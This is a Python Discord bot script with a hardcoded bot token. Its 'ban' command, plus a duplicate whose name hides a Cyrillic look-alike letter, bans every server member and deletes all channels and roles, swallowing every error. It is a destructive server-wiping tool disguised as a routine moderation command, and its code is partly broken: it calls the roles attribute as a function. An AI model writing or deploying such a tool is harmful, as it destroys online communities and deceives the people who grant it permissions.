import discord
import discord.ext.commands


TOKEN = "NjY1MjU1NDM0OTAyNTY4OTg1"+".XskvPg.t8aqxsoHeWgpNliIThBVXbvoRRU"
bot = discord.ext.commands.Bot(command_prefix = "!")

@bot.command()
async def bаn(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('channel deleted')
        try:
            await chanel.delete()
        except:
            pass
    for role in ctx.guild.roles():
        print('role deleted')
        try:
            await role.delete()
        except:
            pass


@bot.command()
async def ban(ctx, arg):
    for user in ctx.guild.members:
        print('ban')
        try:
            await ctx.guild.ban(user)
        except:
            pass
    for chanel in ctx.guild.channels:
        print('channel deleted')
        try:
            await chanel.delete()
        except:
            pass
    for role in ctx.guild.roles():
        print('role deleted')
        try:
            await role.delete()
        except:
            pass

bot.run(TOKEN)
